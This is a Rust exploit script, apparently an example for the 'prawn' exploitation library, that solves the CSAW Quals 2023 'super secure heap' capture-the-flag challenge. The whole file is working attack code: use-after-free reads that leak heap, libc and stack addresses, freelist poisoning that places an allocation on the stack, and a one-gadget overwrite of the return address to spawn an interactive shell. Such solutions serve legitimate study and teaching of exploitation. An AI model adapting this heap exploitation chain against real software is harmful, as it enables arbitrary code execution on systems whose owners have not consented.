/*
   prawn Example Script
   CSAW Quals 2023: "super secure heap"
*/

use prawn::process::tubes::Tube;
use prawn::process::*;
use prawn::util::*;

use std::error::Error;

type Result<T> = std::result::Result<T, Box<dyn Error>>;

trait Exp : Tube {
    fn selkey(&mut self, key: bool) -> Result<()> {
       if !key {
           self.sendlineafter(">".into(), "2".into())?;
       } else {
           self.sendlineafter(">".into(), "1".into())?;
       }
       Ok(())
    }

    fn alloc(&mut self, size: usize, key: bool) -> Result<()> {
        self.selkey(key)?;
        self.sendline("1".into())?;
        self.sendline(format!("{}", size).into())?;
        Ok(())
    }

    fn delete(&mut self, idx: usize, key: bool) -> Result<()> {
        self.selkey(key)?;
        self.sendline("2".into())?;
        self.sendline(format!("{}", idx).into())?;
        Ok(())
    }

    fn modify(&mut self, idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
        self.selkey(false)?;
        self.sendline("3".into())?;
        self.sendline(format!("{}", idx).into())?;
        self.sendline(format!("{}", keyno).into())?;
        self.sendline(format!("{}", size).into())?;
        self.send(cont)?;
        Ok(())
    }

    fn kmodify(&mut self, idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
        self.selkey(true)?;
        self.sendline("3".into())?;
        self.sendline(format!("{}", idx).into())?;
        self.sendline(format!("{}", size).into())?;
        self.sendline(cont)?;
        Ok(())
    }

    fn show(&mut self, idx: usize, key: bool) -> Result<()> {
        self.selkey(key)?;
        self.sendline("4".into())?;
        self.sendline(format!("{}", idx).into())?;
        Ok(())
    }
}

impl Exp for Process {}

fn main() -> Result<()> {
    let cfg = ProcessConfig::default();
    let mut p = Process::new(&["./super_secure_heap_patched"], &cfg)?;

    // setup key
    let key = b"LOL";
    p.alloc(key.len()+1, true)?;
    p.kmodify(0, key.len(), key.to_vec())?;

    // uaf to leak a freelist pointer
    let heap_leak = {
        p.alloc(20, false)?;
        p.alloc(20, false)?;
        p.delete(0, false)?;
        p.delete(1, false)?;

        p.show(1, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let heap_leak = &mut p.recv(6)?;
        heap_leak.append(&mut vec![0u8, 0]);
        u64(&heap_leak)?
    };
    println!("heap: {:#x}", &heap_leak);

    // uaf to leak an arena pointer from unsorted bin consolidation
    let environ_off = 0x1ef600;
    let libc_leak = {
        p.alloc(0xec0, false)?;
        p.alloc(0xec0, false)?;
        p.delete(2, false)?;
        p.delete(3, false)?;

        p.show(2, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let libc_leak = &mut p.recv(6)?;
        libc_leak.append(&mut vec![0u8, 0]);
        u64(&libc_leak)? - 0x1ecbe0
    };
    println!("libc: {:#x}", &libc_leak);

    let environ = libc_leak+environ_off;
    println!("libc environ: {:#x}", &environ);

    // hijack freelist to get an allocation on libc environ to leak stack
    let stack_leak = {
        p.modify(1, 0, p64(environ)?.len(), p64(environ)?)?;

        p.alloc(20, false)?;
        p.alloc(20, false)?;

        p.show(5, false)?;

        p.recvuntil("Here is your content:".into())?;
        p.recvline()?;

        let stack_leak = &mut p.recv(6)?;
        stack_leak.append(&mut vec![0u8, 0]);
        u64(&stack_leak)?
    };
    println!("stack: {:#x}", &stack_leak);

    // get idx 7 on the freelist
    p.alloc(32, false)?;
    p.alloc(32, false)?;
    p.delete(6, false)?;
    p.delete(7, false)?;

    // reallocate 7 as a key (keys contents won't be encrypted)
    p.alloc(32, true)?;

    // free idx 7 again to create a uaf on the previous key chunk
    p.delete(7, false)?;

    // overwrite the freelist pointer to get an allocation on the stack
    let return_addr = stack_leak - 0x100;
    println!("ret leak: {:#x}", &return_addr);
    p.kmodify(1, 8, p64(return_addr)?)?;

    // moves hijacked chunk to top of freelist
    p.alloc(32, false)?;

    // this chunk should be on top of the return addr
    p.alloc(32, true)?;

    // overwrite return addr with one gadget
    let one_gadget = p64(libc_leak+0xe3b01)?;
    p.kmodify(2, 31, one_gadget)?;

    // exit and get shell!
    p.sendline("3".into())?;
    p.interactive()?;
    Ok(())
}
